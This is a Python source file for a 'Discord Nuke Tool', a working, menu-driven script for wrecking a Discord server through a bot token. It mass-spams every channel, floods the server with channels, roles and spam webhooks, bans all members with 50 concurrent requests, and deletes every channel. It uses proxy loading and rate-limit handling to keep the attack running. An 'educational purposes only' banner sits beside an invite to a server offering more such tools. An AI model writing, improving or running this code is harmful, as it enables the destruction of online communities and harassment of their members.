import os
import shutil
import time
import random
import sys
import threading
import asyncio
import aiohttp
import subprocess
import importlib.util
from pystyle import Colorate, Colors
from colorama import init

init()

if os.name == 'nt':
    os.system('mode con: cols=120 lines=30')


def purple_gradient(text, center=False):
    lines = text.splitlines()
    terminal_width = shutil.get_terminal_size().columns if hasattr(shutil, 'get_terminal_size') else 80
    for line in lines:
        if center:
            padding = (terminal_width - len(line)) // 2
            line = ' ' * padding + line
        print(Colorate.Horizontal(Colors.blue_to_white, line))


def loading_animation():
    required_packages = {'discord': 'discord.py', 'aiohttp': 'aiohttp', 'pystyle': 'pystyle', 'colorama': 'colorama'}
    terminal_width = shutil.get_terminal_size().columns if hasattr(shutil, 'get_terminal_size') else 80
    base_text = 'Loading.. '
    frames = ['[\\] ', '[-] ', '[|] ', '[/] ']
    
    packages_to_install = {name: pip_name for name, pip_name in required_packages.items() if importlib.util.find_spec(name) is None}
    all_installed = len(packages_to_install) == 0
    
    if not all_installed:
        for pkg_name, pip_name in packages_to_install.items():
            installing_text = f'Installing {pip_name}.. '
            install_frames = [f'[\\] {installing_text}', f'[-] {installing_text}', f'[|] {installing_text}']
            install_start_time = time.time()
            install_process = subprocess.Popen([sys.executable, '-m', 'pip', 'install', pip_name], 
                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while install_process.poll() is None:
                for frame in install_frames:
                    padding = (terminal_width - len(frame)) // 2
                    centered_frame = ' ' * padding + frame
                    sys.stdout.write(f'\r{Colorate.Horizontal(Colors.blue_to_white, centered_frame)}')
                    sys.stdout.flush()
                    time.sleep(0.1)
                    if time.time() - install_start_time > 30:
                        install_process.terminate()
                        sys.stdout.write(f"\r{' ' * terminal_width}\r")
                        sys.stdout.flush()
                        print(Colorate.Horizontal(Colors.red_to_yellow, f'Failed to install {pip_name}: Timeout. Please install manually.'))
                        sys.exit(1)
            if install_process.returncode == 0:
                sys.stdout.write(f"\r{' ' * terminal_width}\r")
                sys.stdout.flush()
                print(Colorate.Horizontal(Colors.green_to_cyan, f'Successfully installed {pip_name}'))
                continue
            sys.stdout.write(f"\r{' ' * terminal_width}\r")
            sys.stdout.flush()
            error_output = install_process.stderr.read().decode()
            print(Colorate.Horizontal(Colors.red_to_yellow, f'Failed to install {pip_name}: {error_output}'))
            sys.exit(1)
    
    for _ in range(3):
        for frame in frames:
            frame_text = frame + base_text
            padding = (terminal_width - len(frame_text)) // 2
            centered_frame = ' ' * padding + frame_text
            sys.stdout.write(f'\r{Colorate.Horizontal(Colors.blue_to_white, centered_frame)}')
            sys.stdout.flush()
            time.sleep(0.1)
    
    sys.stdout.write(f"\r{' ' * terminal_width}\r")
    sys.stdout.flush()


import discord


def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


class DiscordNukeTool:
    def __init__(self, token, server_id, client):
        custom_log('INFO', 'Initializing DiscordNukeTool')
        self.running = True
        self.token = f'Bot {token}'
        self.raw_token = token
        self.server_id = server_id
        self.client = client
        self.proxies = self.load_file('proxies.txt', 'proxies')
        self.success_count = 0
        self.failed_count = 0
        self.rate_limit_remaining = 50
        self.rate_limit_reset = time.time()
        custom_log('INFO', 'DiscordNukeTool initialization complete')

    def load_file(self, filename: str, file_type: str) -> list:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = [line.strip() for line in f if line.strip()]
                custom_log('SUCCESS', f'Loaded {len(content)} {file_type}')
                return content
        except FileNotFoundError:
            custom_log('WAITING', f'No {file_type} file ({filename}) found!')
            return []

    async def handle_rate_limit(self, response):
        if hasattr(response, 'headers') and 'X-RateLimit-Remaining' in response.headers:
            self.rate_limit_remaining = int(response.headers['X-RateLimit-Remaining'])
            self.rate_limit_reset = float(response.headers.get('X-RateLimit-Reset', time.time()))
        if response.status == 429:
            retry_after = float(response.headers.get('Retry-After', 1))
            custom_log('WAITING', f'Rate limited! Waiting {retry_after} seconds')
            await asyncio.sleep(retry_after)
            return True
        return False

    async def fetch_channels(self):
        headers = {'Authorization': self.token}
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://discord.com/api/v9/guilds/{self.server_id}/channels', headers=headers) as response:
                if await self.handle_rate_limit(response):
                    return await self.fetch_channels()
                if response.status == 200:
                    channels = await response.json()
                    custom_log('SUCCESS', f'Fetched {len(channels)} channels')
                    return [channel['id'] for channel in channels]
                if response.status == 403:
                    error_text = await response.text()
                    custom_log('WAITING', f'Access denied: {error_text}')
                    if '40333' in error_text:
                        custom_log('WAITING', 'Internal Discord network error. Retrying in 5s...')
                        await asyncio.sleep(5)
                        return await self.fetch_channels()
                    custom_log('WAITING', 'Bot may not be in server or lacks permissions!')
                elif response.status == 401:
                    custom_log('WAITING', 'Invalid token!')
                else:
                    custom_log('WAITING', f'Failed to fetch channels: Status {response.status}')
                return []

    async def check_bot_permissions(self, retries=3):
        headers = {'Authorization': self.token}
        attempt = 0
        while attempt < retries:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://discord.com/api/v9/guilds/{self.server_id}', headers=headers) as response:
                    if await self.handle_rate_limit(response):
                        return await self.check_bot_permissions(retries=retries)
                    if response.status == 200:
                        guild = await response.json()
                        custom_log('SUCCESS', f"Bot has access to server: {guild['name']} (ID: {self.server_id})")
                        return True
                    if response.status == 403:
                        error_text = await response.text()
                        custom_log('WAITING', f'Cannot verify server access: Status 403 - {error_text}')
                        if '40333' in error_text:
                            custom_log('WAITING', f'Internal Discord error detected. Retry {attempt + 1}/{retries} in 5s...')
                            await asyncio.sleep(5)
                            attempt += 1
                            continue
                        custom_log('INFO', 'Possible issues: Wrong server ID, bot not in server, or insufficient permissions')
                    elif response.status == 401:
                        custom_log('WAITING', 'Invalid token! Please check your bot token')
                    else:
                        custom_log('WAITING', f'Unexpected error: Status {response.status}')
                    return False
            attempt += 1
        custom_log('WAITING', 'Failed after all retries. Check Discord status or bot setup.')
        return False


def custom_log(status: str, message: str):
    timestamp = time.strftime('%H:%M:%S')
    if status == 'SUCCESS':
        formatted_msg = f'[{timestamp}] {status} » {message}'
        print(Colorate.Horizontal(Colors.green_to_cyan, formatted_msg))
    elif status == 'WAITING':
        formatted_msg = f'[{timestamp}] {status} » {message}'
        print(Colorate.Horizontal(Colors.red_to_yellow, formatted_msg))
    else:
        formatted_msg = f'[{timestamp}] [{status}] {message}'
        print(Colorate.Horizontal(Colors.blue_to_white, formatted_msg))


def print_menu():
    title = '''
 ███▄    █  ▒█████   ██▒   █▓ ▄▄▄         ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
 ██ ▀█   █ ▒██▒  ██▒▓██░   █▒▒████▄       ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▓██  ▀█ ██▒▒██░  ██▒ ▓██  █▒░▒██  ▀█▄     ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
▓██▒  ▐▌██▒▒██   ██░  ▒██ █░░░██▄▄▄▄██    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
▒██░   ▓██░░ ████▓▒░   ▒▀█░   ▓█   ▓██▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░ ░░   ░ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
   ░   ░ ░ ░ ░ ░ ▒       ░░    ░   ▒        ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
         ░     ░ ░        ░        ░  ░                ░ ░      ░ ░      ░  ░
'''
    menu_items = ['Mass Message', 'Create Channels', 'Create Roles', 'Ban Members', 'Webhook Spam', 'Delete All Channels']
    col_count = 2
    col_width = 30
    
    clear_terminal()
    terminal_width = shutil.get_terminal_size().columns
    
    for line in title.splitlines():
        print(Colorate.Horizontal(Colors.blue_to_white, line.center(terminal_width)))
    
    note = 'NOTE: FOR EDUCATIONAL PURPOSES ONLY\nDeveloped by Pepsi | Version Beta\nJoin discord.gg/anhemnova for free tools'
    for line in note.splitlines():
        print(Colorate.Horizontal(Colors.blue_to_white, line.center(terminal_width)))
    
    print()
    
    for i in range(0, len(menu_items), col_count):
        row = menu_items[i:i+col_count]
        while len(row) < col_count:
            row.append('')
        line = ' '.join([f'[{str(i+j+1).zfill(2)}] {row[j]:<{col_width}}' for j in range(col_count)])
        print(Colorate.Horizontal(Colors.blue_to_white, line.center(terminal_width)))
    
    print(Colorate.Horizontal(Colors.blue_to_white, '\n[INPUT] > '), end='')


async def validate_token(token):
    headers = {'Authorization': f'Bot {token.strip()}'}
    async with aiohttp.ClientSession() as session:
        async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as response:
            if response.status == 200:
                user = await response.json()
                custom_log('SUCCESS', f"Token is valid! Logged in as {user['username']}#{user.get('discriminator', '0000')}")
                return (True, token.strip())
            custom_log('WAITING', f'Invalid token! Status: {response.status}')
            return (False, None)


intents = discord.Intents.default()
intents.guilds = True
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game(name='https://discord.gg/anhemnova'))


def mass_message(tool: DiscordNukeTool, loop):
    try:
        message = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter message to spam: '))
        num_messages = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of messages per channel: ')))
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between messages (seconds): ')))

        async def send_message_async(session, channel_id):
            headers = {'Authorization': tool.token}
            for _ in range(num_messages):
                async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                        headers=headers, json={'content': message}) as response:
                    if await tool.handle_rate_limit(response):
                        return await send_message_async(session, channel_id)
                    if response.status == 200:
                        tool.success_count += 1
                        custom_log('SUCCESS', f'Sent message to channel {channel_id}')
                    else:
                        tool.failed_count += 1
                        custom_log('WAITING', f'Failed: Status {response.status}')
                    await asyncio.sleep(delay)

        async def mass_send():
            if not await tool.check_bot_permissions():
                return
            channel_ids = await tool.fetch_channels()
            if not channel_ids:
                custom_log('WAITING', 'No channels found to send messages!')
                return
            custom_log('INFO', f'Sending to {len(channel_ids)} channels')
            async with aiohttp.ClientSession() as session:
                tasks = [send_message_async(session, channel_id) for channel_id in channel_ids]
                await asyncio.gather(*tasks)
        
        custom_log('INFO', f'Starting mass messaging {num_messages} messages per channel with {delay}s delay')
        asyncio.run_coroutine_threadsafe(mass_send(), loop).result()
        custom_log('INFO', f'Mass messaging complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


def create_channels(tool: DiscordNukeTool, loop):
    try:
        channel_name = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter channel name (e.g., nuke-): '))
        num_channels = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of channels: ')))
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between creations (seconds): ')))

        async def create_channel_async(session):
            headers = {'Authorization': tool.token}
            payload = {'name': channel_name, 'type': 0}
            async with session.post(f'https://discord.com/api/v9/guilds/{tool.server_id}/channels', 
                                    headers=headers, json=payload) as response:
                if await tool.handle_rate_limit(response):
                    return await create_channel_async(session)
                if response.status == 201:
                    tool.success_count += 1
                    custom_log('SUCCESS', f'Created channel \'{channel_name}\'')
                else:
                    tool.failed_count += 1
                    custom_log('WAITING', f'Failed: Status {response.status}')
                await asyncio.sleep(delay)

        async def create_all():
            if not await tool.check_bot_permissions():
                return
            async with aiohttp.ClientSession() as session:
                tasks = [create_channel_async(session) for _ in range(min(num_channels, 100))]
                await asyncio.gather(*tasks)
        
        custom_log('INFO', f'Starting creation of {num_channels} channels with {delay}s delay')
        asyncio.run_coroutine_threadsafe(create_all(), loop).result()
        custom_log('INFO', f'Channel creation complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


def create_roles(tool: DiscordNukeTool, loop):
    try:
        role_name = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter role name prefix (e.g., nuke-): '))
        num_roles = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of roles: ')))
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between creations (seconds): ')))

        async def create_role_async(session):
            headers = {'Authorization': tool.token}
            payload = {'name': f'{role_name}{random.randint(1, 1000)}', 'color': random.randint(0, 16777215)}
            async with session.post(f'https://discord.com/api/v9/guilds/{tool.server_id}/roles', 
                                    headers=headers, json=payload) as response:
                if await tool.handle_rate_limit(response):
                    return await create_role_async(session)
                if response.status == 200:
                    tool.success_count += 1
                    custom_log('SUCCESS', 'Created role')
                else:
                    tool.failed_count += 1
                    custom_log('WAITING', f'Failed: Status {response.status}')
                await asyncio.sleep(delay)

        async def create_all():
            if not await tool.check_bot_permissions():
                return
            async with aiohttp.ClientSession() as session:
                tasks = [create_role_async(session) for _ in range(min(num_roles, 100))]
                await asyncio.gather(*tasks)
        
        custom_log('INFO', f'Starting creation of {num_roles} roles with {delay}s delay')
        asyncio.run_coroutine_threadsafe(create_all(), loop).result()
        custom_log('INFO', f'Role creation complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


# ===== PHẦN MASS BAN ĐÃ TỐI ƯU NHANH HƠN =====
def ban_members(tool: DiscordNukeTool, loop):
    try:
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between bans (seconds): ')))
        num_bans_input = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of bans (press Enter for all): '))

        async def get_members():
            headers = {'Authorization': tool.token}
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://discord.com/api/v9/guilds/{tool.server_id}/members?limit=1000', 
                                       headers=headers) as response:
                    if await tool.handle_rate_limit(response):
                        return await get_members()
                    if response.status == 200:
                        members = await response.json()
                        return [member['user']['id'] for member in members]
                    return []

        async def ban_member_async(session, member_id, semaphore):
            async with semaphore:
                headers = {'Authorization': tool.token}
                async with session.put(f'https://discord.com/api/v9/guilds/{tool.server_id}/bans/{member_id}', 
                                       headers=headers, json={'delete_message_days': 1}) as response:
                    if await tool.handle_rate_limit(response):
                        return await ban_member_async(session, member_id, semaphore)
                    if response.status in [200, 204]:
                        tool.success_count += 1
                        custom_log('SUCCESS', f'Banned member {member_id}')
                    else:
                        tool.failed_count += 1
                        custom_log('WAITING', f'Failed to ban {member_id}: Status {response.status}')
                    await asyncio.sleep(delay)

        async def ban_all():
            # Bỏ qua check_permissions để tăng tốc
            member_ids = await get_members()
            if not member_ids:
                custom_log('WAITING', 'No members found or failed to fetch!')
                return
            num_bans = len(member_ids) if num_bans_input == '' else min(int(num_bans_input), len(member_ids))
            custom_log('INFO', f'Banning {num_bans} members with {delay}s delay')
            
            # Dùng semaphore để giới hạn concurrent ban (mặc định 50 luồng song song)
            semaphore = asyncio.Semaphore(50)
            async with aiohttp.ClientSession() as session:
                tasks = [ban_member_async(session, member_id, semaphore) for member_id in member_ids[:num_bans]]
                await asyncio.gather(*tasks)
        
        custom_log('INFO', 'Starting member ban process (optimized with concurrency=50)')
        asyncio.run_coroutine_threadsafe(ban_all(), loop).result()
        custom_log('INFO', f'Banning complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


def webhook_spam(tool: DiscordNukeTool, loop):
    try:
        num_webhooks = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of webhooks to create per channel: ')))
        message = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter message to spam: '))
        num_messages = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter number of messages per webhook: ')))
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between messages (seconds): ')))

        async def create_webhook(session, channel_id):
            headers = {'Authorization': tool.token}
            payload = {'name': f'Spam-Webhook-{random.randint(1, 1000)}'}
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', 
                                    headers=headers, json=payload) as response:
                if await tool.handle_rate_limit(response):
                    return await create_webhook(session, channel_id)
                if response.status == 200:
                    return (await response.json())['url']
                custom_log('WAITING', f'Failed to create webhook in {channel_id}: Status {response.status}')
                return None

        async def spam_webhook_async(session, webhook_url):
            for _ in range(num_messages):
                async with session.post(webhook_url, json={'content': message}) as response:
                    if await tool.handle_rate_limit(response):
                        return await spam_webhook_async(session, webhook_url)
                    if response.status == 204:
                        tool.success_count += 1
                        custom_log('SUCCESS', 'Sent webhook message')
                    else:
                        tool.failed_count += 1
                        custom_log('WAITING', f'Failed: Status {response.status}')
                    await asyncio.sleep(delay)

        async def spam_all():
            if not await tool.check_bot_permissions():
                return
            channel_ids = await tool.fetch_channels()
            if not channel_ids:
                custom_log('WAITING', 'No channels found to create webhooks!')
                return
            webhook_urls = []
            async with aiohttp.ClientSession() as session:
                for channel_id in channel_ids:
                    for _ in range(min(num_webhooks, 10)):
                        webhook_url = await create_webhook(session, channel_id)
                        if webhook_url:
                            webhook_urls.append(webhook_url)
                tasks = [spam_webhook_async(session, url) for url in webhook_urls]
                await asyncio.gather(*tasks)
        
        custom_log('INFO', f'Starting webhook spam with {num_messages} messages per {num_webhooks} webhooks, {delay}s delay')
        asyncio.run_coroutine_threadsafe(spam_all(), loop).result()
        custom_log('INFO', f'Webhook spam complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except Exception as e:
        custom_log('WAITING', f'Error during webhook spam: {str(e)}')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


def delete_all_channels(tool: DiscordNukeTool, loop):
    try:
        duration = int(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter duration in seconds: ')))
        delay = float(input(Colorate.Horizontal(Colors.blue_to_white, 'Enter delay between deletions (seconds): ')))
        
        if duration <= 0:
            custom_log('WAITING', 'Duration must be greater than 0!')
            input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
            return

        async def delete_channel_async(session, channel_id):
            headers = {'Authorization': tool.token}
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as response:
                if await tool.handle_rate_limit(response):
                    return await delete_channel_async(session, channel_id)
                if response.status in [200, 204]:
                    tool.success_count += 1
                    custom_log('SUCCESS', f'Deleted channel {channel_id}')
                else:
                    tool.failed_count += 1
                    custom_log('WAITING', f'Failed to delete {channel_id}: Status {response.status}')
                await asyncio.sleep(delay)

        async def delete_all():
            if not await tool.check_bot_permissions():
                return
            custom_log('INFO', 'Fetching channels...')
            channel_ids = await tool.fetch_channels()
            if not channel_ids:
                custom_log('WAITING', 'No channels available to delete!')
                return
            custom_log('INFO', f'Found {len(channel_ids)} channels to process')
            end_time = time.time() + duration
            async with aiohttp.ClientSession() as session:
                tasks = []
                for channel_id in channel_ids:
                    if time.time() < end_time and tool.running:
                        tasks.append(delete_channel_async(session, channel_id))
                    else:
                        break
                if tasks:
                    await asyncio.gather(*tasks)
        
        custom_log('INFO', f'Starting channel deletion for {duration} seconds with {delay}s delay')
        asyncio.run_coroutine_threadsafe(delete_all(), loop).result()
        custom_log('INFO', f'Channel deletion complete: {tool.success_count} successes, {tool.failed_count} failures')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))
    except ValueError:
        custom_log('WAITING', 'Invalid input!')
        input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


def run_menu(tool, loop):
    commands = {
        '1': lambda: mass_message(tool, loop),
        '2': lambda: create_channels(tool, loop),
        '3': lambda: create_roles(tool, loop),
        '4': lambda: ban_members(tool, loop),
        '5': lambda: webhook_spam(tool, loop),
        '6': lambda: delete_all_channels(tool, loop)
    }
    while True:
        print_menu()
        choice = input().strip()
        custom_log('INFO', f'User selected: {choice}')
        if choice in commands:
            commands[choice]()
        else:
            custom_log('WAITING', 'Invalid choice!')
            input(Colorate.Horizontal(Colors.blue_to_white, 'Press Enter to return...'))


tool = None


async def main():
    global tool
    try:
        clear_terminal()
        purple_gradient('Welcome to Discord Nuke Tool by Pepsi', center=True)
        time.sleep(1)
        loading_animation()
        while True:
            token = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter your Discord Bot token: ')).strip()
            valid, raw_token = await validate_token(token)
            if valid:
                break
            custom_log('WAITING', 'Please enter a valid token!')
            time.sleep(1)
        server_id = input(Colorate.Horizontal(Colors.blue_to_white, 'Enter your Discord server ID: ')).strip()
        tool = DiscordNukeTool(raw_token, server_id, client)
        custom_log('INFO', 'Fetching all channels in the server...')
        channel_ids = await tool.fetch_channels()
        if channel_ids:
            custom_log('SUCCESS', f'Found {len(channel_ids)} channels in server {server_id}:')
            for channel_id in channel_ids[:10]:
                custom_log('INFO', f'Channel ID: {channel_id}')
        else:
            custom_log('WAITING', 'No channels found or unable to fetch channels!')
        loop = asyncio.get_running_loop()
        menu_thread = threading.Thread(target=run_menu, args=(tool, loop), daemon=True)
        menu_thread.start()
        await client.start(raw_token)
    except discord.errors.LoginFailure as e:
        custom_log('WAITING', f'Login failed: {str(e)}')
    except Exception as e:
        custom_log('WAITING', f'Error: {str(e)}')


if __name__ == '__main__':
    asyncio.run(main())